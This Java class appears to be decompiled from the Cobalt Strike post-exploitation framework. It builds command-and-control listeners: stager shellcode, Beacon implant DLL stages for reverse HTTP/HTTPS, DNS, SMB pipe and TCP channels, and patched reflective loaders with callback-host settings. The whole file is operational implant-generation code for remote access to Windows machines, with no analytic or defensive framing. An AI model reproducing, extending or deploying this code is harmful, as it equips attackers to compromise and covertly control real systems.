package common;

import aggressor.AggressorClient;
import aggressor.DataManager;
import aggressor.DataUtils;
import beacon.BeaconPayload;
import beacon.setup.BeaconDLL;
import c2profile.Profile;
import dialog.DialogUtils;
import java.util.HashMap;
import java.util.Map;
import java.util.Stack;
import pe.BeaconLoader;
import sleep.runtime.SleepUtils;
import stagers.Stagers;

public class ScListener {
   protected Map options;
   protected Profile c2profile;
   protected byte[] pubkey;
   protected ListenerConfig config;

   public ScListener(AggressorClient var1, Map var2) {
      this(var1.getData(), var2);
   }

   public ScListener(DataManager var1, Map var2) {
      this(DataUtils.getProfile(var1), DataUtils.getPublicKey(var1), var2);
   }

   public ScListener(Profile var1, byte[] var2, Map var3) {
      this.options = var3;
      this.c2profile = var1.getVariantProfile(this.getVariantName());
      this.pubkey = var2;
      this.config = new ListenerConfig(this.c2profile, this);
   }

   public byte[] getPublicKey() {
      return this.pubkey;
   }

   public String getVariantName() {
      return DialogUtils.string(this.options, "profile");
   }

   public String getHostHeader() {
      return DialogUtils.string(this.options, "althost");
   }

   public Profile getProfile() {
      return this.c2profile;
   }

   public String getName() {
      return DialogUtils.string(this.options, "name");
   }

   public String getPayload() {
      return DialogUtils.string(this.options, "payload");
   }

   public ListenerConfig getConfig() {
      return this.config;
   }

   public int getBindPort() {
      return !DialogUtils.isNumber(this.options, "bindto") ? this.getPort() : DialogUtils.number(this.options, "bindto");
   }

   public boolean isLocalHostOnly() {
      return DialogUtils.bool(this.options, "localonly");
   }

   public int getPort() {
      return DialogUtils.number(this.options, "port");
   }

   public String getStagerHost() {
      return DialogUtils.string(this.options, "host");
   }

   public String getCallbackHosts() {
      return DialogUtils.string(this.options, "beacons");
   }

   public String getCallbackHost() {
      String[] var1 = this.getCallbackHosts().split(",\\s*");
      return var1.length == 0 ? "" : var1[0];
   }

   public String getStrategy() {
      return DialogUtils.string(this.options, "strategy");
   }

   public void setStrategy(String var1) {
      this.options.put("strategy", var1);
   }

   public String getMaxRetryStrategy() {
      return DialogUtils.string(this.options, "maxretry", "none");
   }

   public String getProxyString() {
      return DialogUtils.string(this.options, "proxy");
   }

   public void setProxyString(String var1) {
      this.options.put("proxy", var1);
   }

   public String getDNSResolverString() {
      return DialogUtils.string(this.options, "dnsresolver");
   }

   public void setDNSResolverString(String var1) {
      this.options.put("dnsresolver", var1);
   }

   public String getPipeName() {
      return DialogUtils.string(this.options, "port");
   }

   public String getPipeName(String var1) {
      return "\\\\" + var1 + "\\pipe\\" + this.getPipeName();
   }

   public String getStagerURI(String var1) {
      String var2;
      if ("windows/beacon_http/reverse_http".equals(this.getPayload())) {
         var2 = "x86".equals(var1) ? this.getConfig().getURI() : this.getConfig().getURI_X64();
         return "http://" + this.getStagerHost() + ":" + this.getPort() + var2;
      } else if ("windows/beacon_https/reverse_https".equals(this.getPayload())) {
         var2 = "x86".equals(var1) ? this.getConfig().getURI() : this.getConfig().getURI_X64();
         return "https://" + this.getStagerHost() + ":" + this.getPort() + var2;
      } else if ("windows/foreign/reverse_http".equals(this.getPayload()) && "x86".equals(var1)) {
         var2 = CommonUtils.MSFURI();
         return "http://" + this.getStagerHost() + ":" + this.getPort() + var2;
      } else if ("windows/foreign/reverse_https".equals(this.getPayload()) && "x86".equals(var1)) {
         var2 = CommonUtils.MSFURI();
         return "https://" + this.getStagerHost() + ":" + this.getPort() + var2;
      } else {
         return "";
      }
   }

   public boolean isExternalC2() {
      return "<ExternalC2.Anonymous>".equals(this.getName());
   }

   public boolean hasStager() {
      return this.hasStager("x86");
   }

   public Map toMap() {
      return new HashMap(this.options);
   }

   public Map getC2Info(String var1) {
      HashMap var2 = new HashMap();
      var2.put("bid", var1);
      var2.put("domains", this.getCallbackHosts());
      var2.put("port", this.getPort() + "");
      Map var3 = CommonUtils.toMap("windows/beacon_dns/reverse_dns_txt", "dns", "windows/beacon_http/reverse_http", "http", "windows/beacon_https/reverse_https", "https");
      var2.put("proto", var3.get(this.getPayload()));
      return var2;
   }

   public boolean isForeign() {
      if ("windows/foreign/reverse_http".equals(this.getPayload())) {
         return true;
      } else {
         return "windows/foreign/reverse_https".equals(this.getPayload());
      }
   }

   public boolean hasStager(String var1) {
      if ("windows/foreign/reverse_http".equals(this.getPayload())) {
         return "x86".equals(var1);
      } else if ("windows/foreign/reverse_https".equals(this.getPayload())) {
         return "x86".equals(var1);
      } else if ("windows/beacon_bind_pipe".equals(this.getPayload())) {
         return false;
      } else if ("windows/beacon_bind_tcp".equals(this.getPayload())) {
         return false;
      } else if ("windows/beacon_reverse_tcp".equals(this.getPayload())) {
         return false;
      } else if ("windows/beacon_extc2".equals(this.getPayload())) {
         return false;
      } else if (!"windows/beacon_dns/reverse_dns_txt".equals(this.getPayload())) {
         return "windows/beacon_extc2".equals(this.getPayload()) ? false : this.c2profile.option(".host_stage");
      } else {
         return this.c2profile.option(".host_stage") && "x86".equals(var1);
      }
   }

   public byte[] getPayloadStager(String var1) {
      return Stagers.shellcode(this, this.getPayload(), var1);
   }

   public BeaconDLL _getPayloadStager(String var1) {
      String var2 = "_getPayloadStager(arch)";
      devlog(DevLog.STORY.CS0216, this.getClass(), var2, "starting");
      BeaconDLL var3 = new BeaconDLL();
      var3.fileName = "dont.know.dll";
      var3.originalDLL = this.getPayloadStager(var1);
      var3.peProcessedDLL = var3.originalDLL;
      return var3;
   }

   public byte[] getPayloadStagerLocal(int var1, String var2) {
      return Stagers.shellcodeBindTcp(this, var1, var2);
   }

   public byte[] getPayloadStagerPipe(String var1, String var2) {
      return Stagers.shellcodeBindPipe(this, var1, var2);
   }

   protected String getFile(String var1, String var2) {
      return "x86".equals(var2) ? "resources/" + var1 + ".dll" : "resources/" + var1 + ".x64.dll";
   }

   public byte[] export(String var1) {
      BeaconDLL var2 = this.export(var1, 0, (AggressorClient)null);
      return var2.peProcessedDLL;
   }

   public byte[] exportLocal(AggressorClient var1, String var2, String var3) {
      return this.exportLocal(var1, var2, var3, 0);
   }

   public byte[] exportLocal(AggressorClient var1, String var2, String var3, int var4) {
      String var5 = "exportLocal(client,bid,arch,funk)";
      devlog(DevLog.STORY.CS0216, this.getClass(), var5, "starting with " + var2 + "/" + var3);
      BeaconDLL var6 = this.export(var3, var4, var1);
      devlog(DevLog.STORY.CS0216, this.getClass(), var5, "has hint?");
      if (!BeaconLoader.hasLoaderHint(var1, var6.peProcessedDLL, var3)) {
         devlog(DevLog.STORY.CS0216, this.getClass(), var5, "no hint. calling beaconRDLLGenerate");
         return this.A(var6, var1, var3);
      } else {
         devlog(DevLog.STORY.CS0216, this.getClass(), var5, "have a BeaconEntry(session)?");
         BeaconEntry var7 = DataUtils.getBeacon(var1.getData(), var2);
         if (var7 != null && !var7.isEmpty()) {
            devlog(DevLog.STORY.CS0216, this.getClass(), var5, "arch match?");
            if (!var7.arch().equals(var3)) {
               devlog(DevLog.STORY.CS0216, this.getClass(), var5, "arch mis-match. using peProcessedDLL.");
               return var6.peProcessedDLL;
            } else {
               int var8 = BeaconLoader.getLoaderHint(var6.peProcessedDLL, var3, "GetModuleHandleA");
               int var9 = BeaconLoader.getLoaderHint(var6.peProcessedDLL, var3, "GetProcAddress");
               byte[] var10 = var7.getFunctionHint("GetModuleHandleA");
               byte[] var11 = var7.getFunctionHint("GetProcAddress");
               System.arraycopy(var10, 0, var6.peProcessedDLL, var8, var10.length);
               System.arraycopy(var11, 0, var6.peProcessedDLL, var9, var11.length);
               return this.A(var6, var1, var2, var3, var4, var10, var11);
            }
         } else {
            devlog(DevLog.STORY.CS0216, this.getClass(), var5, "no BeaconEntry(session). using peProcessedDLL.");
            return var6.peProcessedDLL;
         }
      }
   }

   public byte[] export(AggressorClient var1, String var2) {
      return this.export(var1, var2, 0);
   }

   public byte[] export(AggressorClient var1, String var2, int var3) {
      String var4 = "export(client,arch,funk)";
      devlog(DevLog.STORY.CS0215, this.getClass(), var4, "starting with arch: " + var2);
      BeaconDLL var5 = this.export(var2, var3, var1);
      return this.A(var5, var1, var2);
   }

   public BeaconDLL export(String var1, int var2, AggressorClient var3) {
      String var4 = "export(arch,funk)";
      devlog(DevLog.STORY.CS0215, this.getClass(), var4, "starting with arch: " + var1 + " Exporting Beacon Name: " + this.getName() + " Payload: " + this.getPayload());
      if ("windows/foreign/reverse_http".equals(this.getPayload())) {
         devlog(DevLog.STORY.CS0216_TEST, this.getClass(), var4, "foreign http payload stager?");
         return this._getPayloadStager(var1);
      } else if ("windows/foreign/reverse_https".equals(this.getPayload())) {
         devlog(DevLog.STORY.CS0216_TEST, this.getClass(), var4, "foreign https payload stager?");
         return this._getPayloadStager(var1);
      } else {
         BeaconPayload var5 = new BeaconPayload(this, var3, var1, var2);
         if ("windows/beacon_http/reverse_http".equals(this.getPayload())) {
            return var5.exportBeaconStageHTTP(this.getPort(), this.getCallbackHosts(), false, false);
         } else if ("windows/beacon_https/reverse_https".equals(this.getPayload())) {
            return var5.exportBeaconStageHTTP(this.getPort(), this.getCallbackHosts(), false, true);
         } else if ("windows/beacon_dns/reverse_dns_txt".equals(this.getPayload())) {
            return var5.exportBeaconStageDNS(this.getPort(), this.getCallbackHosts(), true, false);
         } else if ("windows/beacon_bind_pipe".equals(this.getPayload()) && this.isExternalC2()) {
            return var5.exportExternalC2Stage();
         } else if ("windows/beacon_bind_pipe".equals(this.getPayload())) {
            return var5.exportSMBStage();
         } else if ("windows/beacon_bind_tcp".equals(this.getPayload())) {
            return var5.exportBindTCPStage();
         } else if ("windows/beacon_reverse_tcp".equals(this.getPayload())) {
            return var5.exportReverseTCPStage();
         } else {
            AssertUtils.TestFail("Unknown payload '" + this.getPayload() + "'");
            BeaconDLL var6 = new BeaconDLL();
            var6.fileName = "unknown.beacon.dll";
            var6.originalDLL = new byte[0];
            var6.peProcessedDLL = new byte[0];
            return var6;
         }
      }
   }

   public int getCustomLoaderSizeKB(AggressorClient var1, String var2, String var3) {
      String var4 = "getCustomLoaderSizeKB";
      devlog(DevLog.STORY.CS0541, this.getClass(), var4, "SCListener.getCustomLoaderSizeKB Arch: " + var3 + " File Name: " + var2);
      Stack var5 = new Stack();
      var5.push(SleepUtils.getScalar(var3));
      var5.push(SleepUtils.getScalar(var2));
      String var6 = var1.getScriptEngine().format("BEACON_RDLL_SIZE", var5);
      int var7 = 0;

      try {
         var7 = Integer.parseInt(var6);
      } catch (NumberFormatException var9) {
         CommonUtils.print_error("BEACON_RDLL_SIZE hook returned an unparsable size (" + var6 + "). Valid values (in KB) are: 0, 5, 100");
      }

      switch (var7) {
         case 0:
            return var7;
         case 5:
         case 100:
            CommonUtils.print_info("BEACON_RDLL_SIZE hook returned size: " + var7);
            return var7;
         default:
            CommonUtils.print_error("BEACON_RDLL_SIZE hook returned an invalid size (" + var6 + "). Valid values (in KB) are: 0, 5, 100");
            return 0;
      }
   }

   private byte[] A(BeaconDLL var1, AggressorClient var2, String var3) {
      if ("windows/foreign/reverse_http".equals(this.getPayload())) {
         return var1.originalDLL;
      }
      if ("windows/foreign/reverse_https".equals(this.getPayload())) {
         return var1.originalDLL;
      }
      String var4 = "beaconRDLLGenerate(beaconDLL)";
      devlog(DevLog.STORY.CS0215, this.getClass(), var4, "preparing to call aggressor script BEACON_RDLL_GENERATE");
      devlog(DevLog.STORY.CS0216, this.getClass(), var4, "preparing to call aggressor script BEACON_RDLL_GENERATE");
      Stack var5 = new Stack();
      var5.push(SleepUtils.getScalar(var3));
      if (var1.usesCustomLoaderSize()) {
         var5.push(SleepUtils.getScalar(var1.customDLL));
         var5.push(SleepUtils.getScalar(var1.customFileName));
      } else {
         var5.push(SleepUtils.getScalar(var1.originalDLL));
         var5.push(SleepUtils.getScalar(var1.fileName));
      }

      String var6 = var2.getScriptEngine().format("BEACON_RDLL_GENERATE", var5);
      if (var6 != null && var6.length() > 0) {
         String var7 = "";
         if (var1.usesCustomLoaderSize()) {
            var7 = var1.customFileName;
         } else {
            var7 = var1.fileName;
         }

         String var8 = "Using user modified reflective DLL! DLLName=" + var7 + " Arch=" + var3;
         CommonUtils.print_info(var8);
         if (DevLog.isEnabled()) {
            long var9 = 0L;
            if (var1.usesCustomLoaderSize()) {
               var9 = DevLog.checksumByteArray(var1.customDLL);
            } else {
               var9 = DevLog.checksumByteArray(var1.originalDLL);
            }

            long var11 = DevLog.checksumByteArray(CommonUtils.toBytes(var6));
            devlog(DevLog.STORY.CS0217, this.getClass(), var4, "File Name: " + var7 + " Original DLL Checksum: " + var9 + " Updated DLL Checksum: " + var11);
         }

         return CommonUtils.toBytes(var6);
      } else {
         devlog(DevLog.STORY.CS0216, this.getClass(), var4, "Using standard reflective DLL!");
         return var1.peProcessedDLL;
      }
   }

   private byte[] A(BeaconDLL var1, AggressorClient var2, String var3, String var4, int var5, byte[] var6, byte[] var7) {
      String var8 = "beaconRDLLGenerateLocal(beaconDLL)";
      devlog(DevLog.STORY.CS0215, this.getClass(), var8, "preparing to call aggressor script BEACON_RDLL_GENERATE_LOCAL");
      devlog(DevLog.STORY.CS0216, this.getClass(), var8, "preparing to call aggressor script BEACON_RDLL_GENERATE_LOCAL");
      Stack var9 = new Stack();
      var9.push(SleepUtils.getScalar(var7));
      var9.push(SleepUtils.getScalar(var6));
      var9.push(SleepUtils.getScalar(var3));
      var9.push(SleepUtils.getScalar(var4));
      if (var1.usesCustomLoaderSize()) {
         var9.push(SleepUtils.getScalar(var1.customDLL));
         var9.push(SleepUtils.getScalar(var1.customFileName));
      } else {
         var9.push(SleepUtils.getScalar(var1.originalDLL));
         var9.push(SleepUtils.getScalar(var1.fileName));
      }

      String var10 = var2.getScriptEngine().format("BEACON_RDLL_GENERATE_LOCAL", var9);
      if (var10 != null && var10.length() > 0) {
         String var11 = "";
         if (var1.usesCustomLoaderSize()) {
            var11 = var1.customFileName;
         } else {
            var11 = var1.fileName;
         }

         String var12 = "Using user modified reflective DLL (local)! DLLName=" + var11 + " Arch=" + var4 + " BeaconID=" + var3;
         CommonUtils.print_info(var12);
         if (DevLog.isEnabled()) {
            long var13 = 0L;
            if (var1.usesCustomLoaderSize()) {
               var13 = DevLog.checksumByteArray(var1.customDLL);
            } else {
               var13 = DevLog.checksumByteArray(var1.originalDLL);
            }

            long var15 = DevLog.checksumByteArray(CommonUtils.toBytes(var10));
            devlog(DevLog.STORY.CS0217, this.getClass(), var8, "File Name: " + var11 + " Original DLL Checksum: " + var13 + " Updated DLL Checksum: " + var15);
         }

         return CommonUtils.toBytes(var10);
      } else {
         devlog(DevLog.STORY.CS0216, this.getClass(), var8, "Using standard reflective DLL!");
         return var1.peProcessedDLL;
      }
   }

   public String toString() {
      if ("windows/beacon_bind_tcp".equals(this.getPayload())) {
         return this.isLocalHostOnly() ? this.getPayload() + " (127.0.0.1:" + this.getPort() + ")" : this.getPayload() + " (0.0.0.0:" + this.getPort() + ")";
      } else if ("windows/beacon_bind_pipe".equals(this.getPayload())) {
         return this.getPayload() + " (\\\\.\\pipe\\" + this.getPipeName() + ")";
      } else if ("windows/beacon_reverse_tcp".equals(this.getPayload())) {
         return this.getPayload() + " (" + this.getStagerHost() + ":" + this.getPort() + ")";
      } else {
         return this.isForeign() ? this.getPayload() + " (" + this.getStagerHost() + ":" + this.getPort() + ")" : this.getPayload() + " (" + this.getCallbackHost() + ":" + this.getPort() + ")";
      }
   }

   public static void devlog(DevLog.STORY var0, Class var1, String var2, String var3) {
      DevLog.log(var0, var1, var2, var3);
   }
}
